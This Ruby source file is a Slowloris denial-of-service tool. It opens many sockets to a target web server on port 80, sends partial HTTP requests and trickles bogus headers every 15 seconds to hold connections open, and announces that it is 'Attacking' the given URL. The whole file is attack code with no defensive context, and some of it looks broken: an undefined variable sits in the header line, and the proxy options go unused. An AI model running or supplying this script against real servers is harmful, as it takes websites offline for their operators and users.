# Standard Ruby 
require 'net/http'
require 'openssl'
require 'getoptlong'
require 'socket'
require 'uri'

# Slowloris Libs
require_relative 'slowloris/banner.rb'
require_relative 'slowloris/version.rb'
require_relative 'slowloris/headers.rb'
require_relative 'colour.rb'

# HTTP Connection options 
url = {}
$USER_AGENT = "#{Slowloris::HEADERS}"
$PROXY =  false
$PROXY_HOST = nil
$PROXY_PORT = 8080
$PROXY_USER = nil 
$PROXY_PASS = nil
$VERBOSE = 0 # 0 = quiet, 1 = verbose, 2 = very verbose
$SOCKET = 10

def init_socket(url)
    #socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
    socket = Socket.new(:INET, :STREAM)
    socket_address = Socket.pack_sockaddr_in(80, $url)
    socket.connect(socket_address)
    
    socket.write(("GET / HTTP/1.1\r\n").encode("utf-8"))
    
    # headers
    $http_headers.each { |h|
        socket.write("#{h}\r\n".encode("utf-8"))
    }
    
    return socket
    end

    def main
        $url = ARGV[0]
        $SOCKET = "#{$SOCKET}".to_i
        puts("Attacking #{$url} with #{$SOCKET} sockets.")

        # creates sockets for the 1st time
        puts("Creating sockets...")
        for i in (1..$SOCKET)
            begin
                puts("Creating socket \##{i}")
                s = init_socket($url)
            rescue
                break;
            end
            $sockets << s
        end

        while true

            # sends keep-alive header to each
            puts("Sending keep-alive headers... Socket count: #{$sockets.size}")
            $sockets.each { |s|
                begin
                    s.write(("X-a: #{n}\r\n" % { n: $random.rand(4999)+1 }).encode("utf-8"))
                rescue
                    $sockets.delete(s)
                end
            }

            # recreates dead sockets
            for i in (1..($SOCKET - $sockets.size))
                puts("Recreating socket...")
                begin
                    s = init_socket($url)
                    $sockets << s if s
                rescue
                    break
                end
            end

            # sleeps for a while
            sleep(15)
        end
    end


$random = Random.new(1234)
$sockets = [] # my array of sockets
$http_headers = [ 
    "User-Agent: #{$USER_AGENT}",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
]